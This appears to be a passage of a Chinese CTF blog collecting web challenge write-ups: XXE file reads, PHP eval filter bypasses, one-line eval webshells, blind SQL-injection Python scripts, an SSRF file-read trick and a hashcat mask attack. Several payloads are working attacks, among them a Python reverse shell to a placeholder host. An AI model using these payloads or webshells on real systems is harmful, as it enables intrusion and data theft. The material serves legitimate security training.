&lt;group&gt;CSAW2019&lt;/group&gt; &lt;/user&gt; &lt;user&gt; &lt;username&gt;bob&lt;/username&gt; &lt;password&gt;passwd2&lt;/password&gt; &lt;name&gt; Bob&lt;/name&gt; &lt;email&gt;bob@fakesite.com&lt;/email&gt; &lt;group&gt;CSAW2019&lt;/group&gt; &lt;/user&gt;&lt;/users&gt; 明显的xee，结合提示flag在/flag下，我们直接构造payload： 12345678910111213&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE users[&lt;!ENTITY payload SYSTEM &quot;file:///flag&quot; &gt;]&gt;&lt;users&gt; &lt;user&gt; &lt;username&gt;bob&lt;/username&gt; &lt;password&gt;passwd2&lt;/password&gt; &lt;name&gt; Bob&lt;/name&gt; &lt;email&gt;bob@fakesite.com&lt;/email&gt; &lt;group&gt;CSAW2019&lt;/group&gt; &lt;intro&gt;&amp;payload;&lt;/intro&gt; &lt;/user&gt;&lt;/users&gt; 上传1.xml，结果发现有waf，尝试用utf-16编码： 1iconv -f utf8 -t utf16 1.xml&gt;2.xml 再次上传即可获取flag。 hardrce_3审计源码： 12345678910111213141516171819202122232425 &lt;?phpheader(&quot;Content-Type:text/html;charset=utf-8&quot;);error_reporting(0);highlight_file(__FILE__);if(isset($_GET[&#x27;wllm&#x27;]))&#123; $wllm = $_GET[&#x27;wllm&#x27;]; $blacklist = [&#x27; &#x27;,&#x27;\\^&#x27;,&#x27;\\~&#x27;,&#x27;\\|&#x27;]; foreach ($blacklist as $blackitem) &#123; if (preg_match(&#x27;/&#x27; . $blackitem . &#x27;/m&#x27;, $wllm)) &#123; die(&quot;小伙子只会异或和取反？不好意思哦LTLT说不能用！！&quot;); &#125;&#125;if(preg_match(&#x27;/[a-zA-Z0-9]/is&#x27;,$wllm))&#123; die(&quot;Ra&#x27;sAlGhul说用字母数字是没有灵魂的！&quot;);&#125;echo &quot;NoVic4说：不错哦小伙子，可你能拿到flag吗？&quot;;eval($wllm);&#125;else&#123; echo &quot;蔡总说：注意审题！！！&quot;;&#125;?&gt; 这题把取反和异或全给禁了，我们采用自增的方式构建payload，记得url编码： 1http://1.14.71.254:28041/?wllm=%24_%3D%5B%5D%3B%24_%3D%40%22%24_%22%3B%24_%3D%24_%5B%27%21%27%3D%3D%27%40%27%5D%3B%24___%3D%24_%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24____%3D%27_%27%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24_%3D%24%24____%3B%24___%28%24_%5B_%5D%29%3B 这样我们就写入了一个webshell，查看phpinfo，发现一些系统函数被禁用，因此我们直接上传一个一句话： 1_=file_put_contents(&#x27;1.php&#x27;,&#x27;&lt;?php @eval($_POST[&#x27;mrl64&#x27;]);?&gt;&#x27;); 蚁剑连接即可。 [鹤城杯 2021]Middle magic审计源码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152 &lt;?phphighlight_file(__FILE__);include &quot;./flag.php&quot;;include &quot;./result.php&quot;;if(isset($_GET[&#x27;aaa&#x27;]) &amp;&amp; strlen($_GET[&#x27;aaa&#x27;]) &lt; 20)&#123; $aaa = preg_replace(&#x27;/^(.*)level(.*)$/&#x27;, &#x27;$&#123;1&#125;&lt;!-- filtered --&gt;$&#123;2&#125;&#x27;, $_GET[&#x27;aaa&#x27;]); if(preg_match(&#x27;/pass_the_level_1#/&#x27;, $aaa))&#123; echo &quot;here is level 2&quot;; if (isset($_POST[&#x27;admin&#x27;]) and isset($_POST[&#x27;root_pwd&#x27;])) &#123; if ($_POST[&#x27;admin&#x27;] == $_POST[&#x27;root_pwd&#x27;]) echo &#x27;&lt;p&gt;The level 2 can not pass!&lt;/p&gt;&#x27;; // START FORM PROCESSING else if (sha1($_POST[&#x27;admin&#x27;]) === sha1($_POST[&#x27;root_pwd&#x27;]))&#123; echo &quot;here is level 3,do you kown how to overcome it?&quot;; if (isset($_POST[&#x27;level_3&#x27;])) &#123; $level_3 = json_decode($_POST[&#x27;level_3&#x27;]); if ($level_3-&gt;result == $result) &#123; echo &quot;success:&quot;.$flag; &#125; else &#123; echo &quot;you never beat me!&quot;; &#125; &#125; else&#123; echo &quot;out&quot;; &#125; &#125; else&#123; die(&quot;no&quot;); &#125; // perform validations on the form data &#125; else&#123; echo &#x27;&lt;p&gt;out!&lt;/p&gt;&#x27;; &#125; &#125; else&#123; echo &#x27;nonono!&#x27;; &#125; echo &#x27;&lt;hr&gt;&#x27;;&#125;?&gt; 第一关是传入aaa，要求内容为pass_the_level_1#，但是不能匹配到level，老考点了，这里用%0a截断。 接着是第二关，POSTadmin参数和root_pwd参数，要求两者值不等但是sha1的值要相等，也是老考点，数组就行。 最后一关，传入level_3参数，要求这个参数的内容经过json解码后的result的值能够等于$result。这个变量的值我们不知道，但不重要，result为0就可以了。 最终payload： 12?aaa=%0apass_the_level_1%23POST:admin[]=1&amp;root_pwd[]=2&amp;level_3=&#123;&quot;result&quot;:0&#125; [NCTF 2019]SQLi进入网页是一个登录框，同时还给了sql查询语句： 1sqlquery : select * from users where username=&#x27;&#x27; and passwd=&#x27;&#x27; 尝试信息搜集，发现robots.txt，访问并发现hint.txt： 123456$black_list = &quot;/limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|%00|\\&#x27;|=| |in|&lt;|&gt;|-|\\.|\\(\\)|#|and|if|database|users|where|table|concat|insert|join|having|sleep/i&quot;;If $_POST[&#x27;passwd&#x27;] === admin&#x27;s password,Then you will get the flag; 看得出来，这过滤太狠毒了，但是又提示我们只要得到密码就可以了，这让我们想起了hgame第三周的那题盲注。但是like被过滤了，因此我们使用regexp来进行匹配。 还有一点，如果直接从python传入%00会被转义，因此我们需要使用parse.unquote(&#39;%00&#39;)来避免这一情况。 exp： 1234567891011121314151617181920212223import requestsimport stringfrom urllib import parsestrs = string.ascii_lowercase + string.ascii_uppercase + string.digits + &quot;_&quot;url = &quot;http://1.14.71.254:28053/index.php&quot;name = &#x27;&#x27;for i in range(0, 100): for j in strs: z = name + j payload = &quot;||passwd/**/regexp/**/\\&quot;^&#123;&#125;\\&quot;;&#123;&#125;&quot;.format(z, parse.unquote(&#x27;%00&#x27;)) data = &#123; &quot;username&quot;: &quot;\\\\&quot;, &quot;passwd&quot;: payload &#125; r = requests.post(url, data=data) if &quot;welcome&quot; in r.text: name += j print(name) breakprint(name) 获得密码后登陆得到flag。","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-write up -ctf -web","slug":"write-up-ctf-web","permalink":"http://example.com/tags/write-up-ctf-web/"}]},{"title":"buu练习6","slug":"buu练习6","date":"2022-03-11T07:53:06.000Z","updated":"2022-03-11T13:44:44.008Z","comments":true,"path":"2022/03/11/buu练习6/","link":"","permalink":"http://example.com/2022/03/11/buu%E7%BB%83%E4%B9%A06/","excerpt":"前言 还是凑字数用的，前言总要有点字在，才不显得空荡荡的。","text":"前言 还是凑字数用的，前言总要有点字在，才不显得空荡荡的。 [SUCTF 2019]Pythonginx审计源码，自己整理了下： 1234567891011121314151617181920@app.route(&#x27;/getUrl&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])def getUrl(): url = request.args.get(&quot;url&quot;) host = parse.urlparse(url).hostname if host == &#x27;suctf.cc&#x27;: return &quot;我扌 your problem? 111&quot; parts = list(urlsplit(url)) host = parts[1] if host == &#x27;suctf.cc&#x27;: return &quot;我扌 your problem? 222 &quot; + host newhost = [] for h in host.split(&#x27;.&#x27;): newhost.append(h.encode(&#x27;idna&#x27;).decode(&#x27;utf-8&#x27;)) parts[1] = &#x27;.&#x27;.join(newhost) #去掉 url 中的空格 finalUrl = urlunsplit(parts).split(&#x27; &#x27;)[0] host = parse.urlparse(finalUrl).hostname if host == &#x27;suctf.cc&#x27;: return urllib.request.urlopen(finalUrl).read() else: return &quot;我扌 your problem? 333&quot; 一段python，简单来说就是刚开始传入时不能让parse.urlparse(url).hostname和parts[1]的值为suctf.cc，但是在经过for循环的处理后要让这个值变为suctf.cc。for循环中是把url按照点分割分别进行idna编码后再进行utf-8解码。 方法一一时半会也没啥想法，就把源码扔python跑下试试，经过多次测试发现了一个绕过方法： 12345678910111213141516171819202122from urllib.parse import urlsplit,urlunsplit, unquotefrom urllib import parseurl = &quot;http:////suctf.cc/&quot;host = parse.urlparse(url).hostnameprint(host)parts = list(urlsplit(url))host = parts[1]print(host)newhost = []for h in host.split(&#x27;.&#x27;): newhost.append(h.encode(&#x27;idna&#x27;).decode(&#x27;utf-8&#x27;)) parts[1] = &#x27;.&#x27;.join(newhost) finalUrl = urlunsplit(parts).split(&#x27; &#x27;)[0] host = parse.urlparse(finalUrl).hostnameprint(host)//OutPut:Nonesuctf.cc 再用任意文件读取nginx的配置文件： 1file:////suctf.cc/usr/local/nginx/conf/nginx.conf 最后读取flag： 1file:////suctf.cc/usr/fffffflag 方法二这个方法利用的是idna解码与utf-8解码后是否存在一个字符会改变得到一个我们需要的字母，我们可以用脚本测试下： 12345678910# coding:utf-8 for i in range(128,65537): tmp=chr(i) try: res = tmp.encode(&#x27;idna&#x27;).decode(&#x27;utf-8&#x27;) if(&quot;-&quot;) in res: continue print(&quot;U:&#123;&#125; A:&#123;&#125; ascii:&#123;&#125; &quot;.format(tmp, res, i)) except: pass 发现确实存在很多这样的字符，因此用其中一个来替代就可以了，payload： 12file:////suctf.cⒸ/usr/local/nginx/conf/nginx.conffile:////suctf.cⒸ/usr/fffffflag 这里也顺便再写下nginx的常见目录： 配置文件存放目录：/etc/nginx 主要配置文件：/etc/nginx/conf/nginx.conf 管理脚本：/usr/lib64/systemd/system/nginx.service 模块：/usr/lisb64/nginx/modules 应用程序：/usr/sbin/nginx 程序默认存放位置：/usr/share/nginx/html 日志默认存放位置：/var/log/nginx Nginx配置文件：/usr/local/nginx/conf/nginx.conf [FBCTF2019]RCEService方法一这题只有个输入框让我们输入json，什么都没有，在黑盒情况下我也不知道过滤了啥，不过根据提示内容上看应该是使用preg_match()进行了正则匹配，因此尝试用%0A绕过： 1&#123;%0A&quot;cmd&quot;:&quot;ls&quot;%0A&#125; 发现绕过成功，回显当前目录中的文件名。因此尝试寻找flag，但是找了会没找到，因此想读源码，又发现cat不能执行。这是个很严重的问题，因为不能cat的话即使我们找到了flag文件也无法读取。 我去找wp后发现不知道为啥他们直接就有源码，发现好像原题是有给的，麻了，审计一下： 123456789101112131415161718192021222324&lt;?phpputenv(&#x27;PATH=/home/rceservice/jail&#x27;);if (isset($_REQUEST[&#x27;cmd&#x27;])) &#123; $json = $_REQUEST[&#x27;cmd&#x27;]; if (!is_string($json)) &#123; echo &#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;; &#125; elseif (preg_match(&#x27;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\\x00-\\x1FA-Z0-9!#-\\/;-@\\[-`|~\\x7F]+).*$/&#x27;, $json)) &#123; echo &#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;; &#125; else &#123; echo &#x27;Attempting to run command:&lt;br/&gt;&#x27;; $cmd = json_decode($json, true)[&#x27;cmd&#x27;]; if ($cmd !== NULL) &#123; system($cmd); &#125; else &#123; echo &#x27;Invalid input&#x27;; &#125; echo &#x27;&lt;br/&gt;&lt;br/&gt;&#x27;; &#125;&#125;?&gt; 过滤的相当狠，但是他没有过滤cat。这时我们发现问题所在： 1putenv(&#x27;PATH=/home/rceservice/jail&#x27;); 它的PATH被设置过了，那flag很可能就在这个PATH中，而且可能由于这个PATH中没有cat，导致了我们不能直接使用cat命令，因此要使用绝对路径。payload： 1&#123;%0A&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag&quot;%0A&#125; 方法二既然是绕过preg_match()，那么我们可以利用p牛之前一篇文章中写过的一个方法，我们可以尝试进行利用：PHP利用PCRE回溯次数限制绕过某些安全限制 这篇文章写的十分详细，可以帮助我们加深对正则匹配的理解。 根据文章内容，我们了解到php的回溯次数是有限制的，因此我们可以使他不停进行回溯直到超过限制从而达到绕过效果，这个方法在ctfshow欢乐新春赛中也有过类似的题目。 因此我们构建exp： 12345678import requestsurl=&#x27;http://9c7efde7-b024-4f3a-9e42-a0f0cf9567fc.node4.buuoj.cn:81/index.php&#x27;data=&#123; &#x27;cmd&#x27;:&#x27;&#123;&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag&quot;,&quot;feng&quot;:&quot;&#x27;+&#x27;a&#x27;*1000000+&#x27;&quot;&#125;&#x27;&#125;r=requests.post(url=url,data=data).textprint(r) 成功读取flag。 [CISCN2019 总决赛 Day2 Web1]Easyweb进去登录框，试着随便登陆了下发现图片不一样了，但是没啥思路。扫描目录发现robots.txt，提示存在备份文件。经测试存在的是image.php.bak，下载文件，审计代码： 123456789101112131415161718&lt; ?phpinclude &quot;config.php&quot;;$id=isset($_GET[&quot;id&quot;])?$_GET[&quot;id&quot;]:&quot;1&quot;;$path=isset($_GET[&quot;path&quot;])?$_GET[&quot;path&quot;]:&quot;&quot;;$id=addslashes($id);$path=addslashes($path);$id=str_replace(array(&quot;\\\\0&quot;,&quot;%00&quot;,&quot;\\\\&#x27;&quot;,&quot;&#x27;&quot;),&quot;&quot;,$id);$path=str_replace(array(&quot;\\\\0&quot;,&quot;%00&quot;,&quot;\\\\&#x27;&quot;,&quot;&#x27;&quot;),&quot;&quot;,$path);$result=mysqli_query($con,&quot;select * from images where id=&#x27;&#123;$id&#125;&#x27; or path=&#x27;&#123;$path&#125;&#x27;&quot;);$row=mysqli_fetch_array($result,MYSQLI_ASSOC);$path=&quot;./&quot; . $row[&quot;path&quot;];header(&quot;Content-Type: image/jpeg&quot;);readfile($path); 分析这段代码，我们发现我们要传入一个id与一个path参数，同时对传入的参数会使用addslashes()进行转义，转义后会将\\0、%00、\\、&#39;替换为空。 这段代码的核心当然是sql查询语句，我们的思路就是让id中的单引号逃逸一个出来，让id的值变成&#39;&#123;$id&#125;\\&#39; or path=&#39;，这样我们就可以在path变量中写入sql语句了。 因此我们要让id的值为反斜杠，但是直接写入反斜杠会被替换，我们应该利用好addslashes()函数，用这个函数来帮助我们构造反斜杠。 如果我们传入的是\\0，我们发现首先传入后经过addslashes()会转义为\\\\0，接着进行替换后后面的\\0被替换成空，留下反斜杠。 由于没有回显，因此利用盲注，exp： 12345678910111213141516171819202122232425262728293031323334353637import requestsimport timeurl = &quot;http://565b6ad6-b33f-41ef-807e-74fb15ed65cb.node4.buuoj.cn:81/image.php&quot;flag= &quot;&quot;for i in range(1, 500): time.sleep(0.06) low = 32 high = 128 mid = (low + high)&gt;&gt;1 while (low &lt; high): # 库名 #payload = &quot;or id=if(ascii(substr((select group_concat(schema_name) from information_schema.schemata limit 1 offset 0),&#123;&#125;,1))&gt;&#123;&#125;,1,0)#&quot;.format(i, mid) # 表名 #payload = &quot;or id=if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database() limit 1 offset 0),&#123;&#125;,1))&gt;&#123;&#125;,1,0)#&quot;.format(i, mid) # 字段名 #payload = &quot;or id=if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=0x7573657273 limit 1 offset 0),&#123;&#125;,1))&gt;&#123;&#125;,1,0)#&quot;.format(i, mid) # 内容 payload = &quot;or id=if(ascii(substr((select password from users limit 1 offset 0),&#123;&#125;,1))&gt;&#123;&#125;,1,0)#&quot;.format(i, mid) params = &#123; &#x27;id&#x27;: &#x27;\\\\\\\\0&#x27;, &#x27;path&#x27;: payload &#125; r = requests.get(url, params=params) time.sleep(0.05) #print(r.content) if b&quot;JFIF&quot; in r.content: low = mid + 1 else: high = mid mid = (low + high) &gt;&gt;1 if (mid == 32 or mid == 127): break flag += chr(mid) print(flag)print(flag) 得到密码后登陆，是一个文件上传，经过测试发现文件内容过滤php，因此采用短标签绕过： 1&lt;?=@eval($_POST[&#x27;mrl64&#x27;]);?&gt; 将文件名更改后上传： 1I logged the file name you uploaded to logs/upload.efd6e24b03e887bb13b11b890467f233.log.php. LOL 用蚁剑连接，根目录得到flag。 [网鼎杯 2020 白虎组]PicDown这个url卡了我老半天，我一直用伪协议读，没想到真就是直接任意文件读取，太淦了。 更离谱的是可以直接读出flag，但这个肯定不是预期解。我们先读取进程： 1?url=../../../../proc/self/cmdline 发现存在app.py，读取文件： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152from flask import Flask, Responsefrom flask import render_templatefrom flask import requestimport osimport urllibapp = Flask(__name__)SECRET_FILE = &quot;/tmp/secret.txt&quot;f = open(SECRET_FILE)SECRET_KEY = f.read().strip()os.remove(SECRET_FILE)@app.route(&#x27;/&#x27;)def index(): return render_template(&#x27;search.html&#x27;)@app.route(&#x27;/page&#x27;)def page(): url = request.args.get(&quot;url&quot;) try: if not url.lower().startswith(&quot;file&quot;): res = urllib.urlopen(url) value = res.read() response = Response(value, mimetype=&#x27;application/octet-stream&#x27;) response.headers[&#x27;Content-Disposition&#x27;] = &#x27;attachment; filename=beautiful.jpg&#x27; return response else: value = &quot;HACK ERROR!&quot; except: value = &quot;SOMETHING WRONG!&quot; return render_template(&#x27;search.html&#x27;, res=value)@app.route(&#x27;/no_one_know_the_manager&#x27;)def manager(): key = request.args.get(&quot;key&quot;) print(SECRET_KEY) if key == SECRET_KEY: shell = request.args.get(&quot;shell&quot;) os.system(shell) res = &quot;ok&quot; else: res = &quot;Wrong Key!&quot; return resif __name__ == &#x27;__main__&#x27;: app.run(host=&#x27;0.0.0.0&#x27;, port=8080) 发现一个路由，我们需要输入一个key参数与SECRET_KEY进行比较，比较正确就会执行我们传入的shell参数。我们发现这个密码应该是存在/tmp/secret.txt中，且文件打开了没有关闭，这个题之前有做过类似的，我们可以从/proc/[pid]/fd中读取，因此我们爆破/proc/self/fd/* 在/proc/self/fd/3中发现密钥，结果执行shell后发现是无回显rce，那就是要反弹shell了，构建payload： 1python%20-c%20%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22xx.xx.xx.xx%22,8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/bash%22,%22-i%22]);%27 最后成功反弹shell，获取flag TOP SECRET（hgame2022-misc）做web真的累，干脆最后水一题吧，这道题来自hgame2022第四周的misc，因为有难度我就拿来复现下。 首先题目给了个流量包，这个地方脑洞太大了，我直接放原wp了： 首先，观察流量可以发现流量在不停的对形如x.x.x.x.x.x.x.x.x.的地址发送 ping 请求。其中，内容为 HGAME2022 的都是混淆项。提取出剩下的地址稍加整理，发现都是同一字母的大小写变化。根据 Hint (利用的时候按照8+1分组)，前8位按照大小写转换成1和0，组成的2进制转成10进制，为流量包顺序。最后的一位不需要进行处理，为信息。按顺序连接字符成字符串。得到的字符串观察后发现只含有 [A-Za-z] ，结合 Hint (处理完之后得到的东西是一种不常见的进制转换)，猜测是一种不含数字的52进制转换。转换回10进制后即可得到本部分结果 第一步得到的结果为： 12$6$6ldh0bSoluytiIS2$vs6caYlhCSX1rmWaPrdDYI55hIg3Ls75PnbJmEBfYOsZRaknhS4cTdmyIbHPWz/2dTAdQUEM7IEmOc.GPo5UO. 接下来进入第二步，根据开头的$6$确定这行结果为sha512加密，题目中给的文本提供了我们掩码以及提示，因此构造对应的hashcat命令进行攻击： 1hashcat -a 3 -m 1800 --force &#x27;$6$6ldh0bSoluytiIS2$vs6caYlhCSX1rmWaPrdDYI55hIg3Ls75PnbJmEBfYOsZRaknhS4cTdmyIbHPWz/2dTAdQUEM7IEmOc.GPo5UO.&#x27; --custom-charset1 &#x27;abcdefgnopqrs&#x27; --custom-charset2 &#x27;hijklmtuvwxyz&#x27; co?2b?2nd_7?up?dm6Q_?1nd_4br?d9Pc 跑出结果： 1combind_7Jp8m6Q_and_4br39Pc 因此密码为7Jp8m6Q4br39Pc，这就是压缩包的密码，而最后得到一张图片，根据上边不规则的色块，怀疑是iOS特供图。具体原理大概是使用特定的色块影响iOS系统的压缩算法。 使用非iOS系统可得到半张二维码，使用iOS系统可得到另外半张二维码，合并扫描即可。 当然也有网站可以做到这一点：FotoForensics","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -write up -ctf","slug":"web-write-up-ctf","permalink":"http://example.com/tags/web-write-up-ctf/"}]},{"title":"buu练习5","slug":"buu练习5","date":"2022-03-07T10:34:20.000Z","updated":"2022-03-07T14:13:31.062Z","comments":true,"path":"2022/03/07/buu练习5/","link":"","permalink":"http://example.com/2022/03/07/buu%E7%BB%83%E4%B9%A05/","excerpt":"前言 凑字数用的，前言总要有点字在不显得空荡荡的。","text":"前言 凑字数用的，前言总要有点字在不显得空荡荡的。 [GXYCTF2019]禁止套娃上来啥都没有，经过尝试信息搜集发现是git源码泄露，用GitHack获取源码： 123456789101112131415161718192021222324&lt;?phpinclude &quot;flag.php&quot;;echo &quot;flag在哪里呢？&lt;br&gt;&quot;;if(isset($_GET[&#x27;exp&#x27;]))&#123; if (!preg_match(&#x27;/data:\\/\\/|filter:\\/\\/|php:\\/\\/|phar:\\/\\//i&#x27;, $_GET[&#x27;exp&#x27;])) &#123; if(&#x27;;&#x27; === preg_replace(&#x27;/[a-z,_]+\\((?R)?\\)/&#x27;, NULL, $_GET[&#x27;exp&#x27;])) &#123; if (!preg_match(&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;, $_GET[&#x27;exp&#x27;])) &#123; // echo $_GET[&#x27;exp&#x27;]; @eval($_GET[&#x27;exp&#x27;]); &#125; else&#123; die(&quot;还差一点哦！&quot;); &#125; &#125; else&#123; die(&quot;再好好想想！&quot;); &#125; &#125; else&#123; die(&quot;还想读flag，臭弟弟！&quot;); &#125;&#125;// highlight_file(__FILE__);?&gt; 过滤了伪协议相关的语句以及一些关键词，同时进行参数匹配，因此这是典型的无参数rce，这不巧了，前两天刚写的博客，因此直接用无参数rce的payload打就可以了。 由于过滤了et，因此之前博客写的一些函数不能用了，这里要用下面这个函数： localconv():函数返回一包含本地数字及货币格式信息的数组 我们用这个函数来获取第一个目录，即.，当前目录，然后扫目录找到flag文件读取就可以了，payload： 1?exp=show_source(next(array_reverse(scandir(current(localeconv()))))); [极客大挑战 2019]RCE ME审计源码： 1234567891011121314151617 &lt;?phperror_reporting(0);if(isset($_GET[&#x27;code&#x27;]))&#123; $code=$_GET[&#x27;code&#x27;]; if(strlen($code)&gt;40)&#123; die(&quot;This is too Long.&quot;); &#125; if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code))&#123; die(&quot;NO.&quot;); &#125; @eval($code);&#125;else&#123; highlight_file(__FILE__);&#125;// ?&gt; 很明显的无字符webshell，取反即可，但是我们发现phpinfo中过滤了大部分函数，因此我们不能直接rce。 既然如此，先上传一句马： 123?code=(~%9e%8c%8c%9a%8d%8b)(~%9a%89%9e%93%d7%db%a0%af%b0%ac%ab%a4%ce%a2%d6);//assert(eval($_POST[1])); 在根目录下找到flag，但是不能直接读取，这里用蚁剑中的绕过disabled_functions插件，在虚拟终端中执行/readflag读取flag。 [MRCTF2020]套娃进入网页在审查元素中发现部分源码： 1234567891011//1st$query = $_SERVER[&#x27;QUERY_STRING&#x27;]; if( substr_count($query, &#x27;_&#x27;) !== 0 || substr_count($query, &#x27;%5f&#x27;) != 0 )&#123; die(&#x27;Y0u are So cutE!&#x27;);&#125; if($_GET[&#x27;b_u_p_t&#x27;] !== &#x27;23333&#x27; &amp;&amp; preg_match(&#x27;/^23333$/&#x27;, $_GET[&#x27;b_u_p_t&#x27;]))&#123; echo &quot;you are going to the next ~&quot;;&#125;! 代码中要求获取的变量名不含有_，用%20代替即可，而下面的内容匹配比较常规，用换行符绕过即可： 1?b%20u%20p%20t=23333%0A 接着提示我们下一步在secrettw.php文件中，访问发现由于ip不匹配，我们不能访问。但是在审查元素中发现jsfuck，控制台跑一下发现让我们POST一个Merak进去，随便POST之后得到源码： 12345678910111213141516171819202122232425262728Flag is here~But how to get it? &lt;?php error_reporting(0); include &#x27;takeip.php&#x27;;ini_set(&#x27;open_basedir&#x27;,&#x27;.&#x27;); include &#x27;flag.php&#x27;;if(isset($_POST[&#x27;Merak&#x27;]))&#123; highlight_file(__FILE__); die(); &#125; function change($v)&#123; $v = base64_decode($v); $re = &#x27;&#x27;; for($i=0;$i&lt;strlen($v);$i++)&#123; $re .= chr ( ord ($v[$i]) + $i*2 ); &#125; return $re; &#125;echo &#x27;Local access only!&#x27;.&quot;&lt;br/&gt;&quot;;$ip = getIp();if($ip!=&#x27;127.0.0.1&#x27;)echo &quot;Sorry,you don&#x27;t have permission! Your ip is :&quot;.$ip;if($ip === &#x27;127.0.0.1&#x27; &amp;&amp; file_get_contents($_GET[&#x27;2333&#x27;]) === &#x27;todat is a happy day&#x27; )&#123;echo &quot;Your REQUEST is:&quot;.change($_GET[&#x27;file&#x27;]);echo file_get_contents(change($_GET[&#x27;file&#x27;])); &#125;?&gt; 审计代码，我们发现后端对ip进行了限制，对2333的内容进行了匹配，对file进行了change()，因此我们只要针对这三点绕过就可以了。 先反写flag.php： 1234567891011121314151617&lt;?phpfunction unchange($v)&#123; $re = &#x27;&#x27;; for($i=0;$i&lt;strlen($v);$i++)&#123; $re .= chr ( ord ($v[$i]) - $i*2 ); &#125; return $re; &#125;$file = unchange(&#x27;flag.php&#x27;);echo base64_encode($file);?&gt;//ZmpdYSZmXGI= payload： 123?2333=data://text/plain;base64,dG9kYXQgaXMgYSBoYXBweSBkYXk=&amp;file=ZmpdYSZmXGI=Client-IP: 127.0.0.1 [红明谷CTF 2021]write_shell审计源码： 123456789101112131415161718192021222324252627282930313233343536 &lt;?phperror_reporting(0);highlight_file(__FILE__);function check($input)&#123; if(preg_match(&quot;/&#x27;| |_|php|;|~|\\\\^|\\\\+|eval|&#123;|&#125;/i&quot;,$input))&#123; // if(preg_match(&quot;/&#x27;| |_|=|php/&quot;,$input))&#123; die(&#x27;hacker!!!&#x27;); &#125;else&#123; return $input; &#125;&#125;function waf($input)&#123; if(is_array($input))&#123; foreach($input as $key=&gt;$output)&#123; $input[$key] = waf($output); &#125; &#125;else&#123; $input = check($input); &#125;&#125;$dir = &#x27;sandbox/&#x27; . 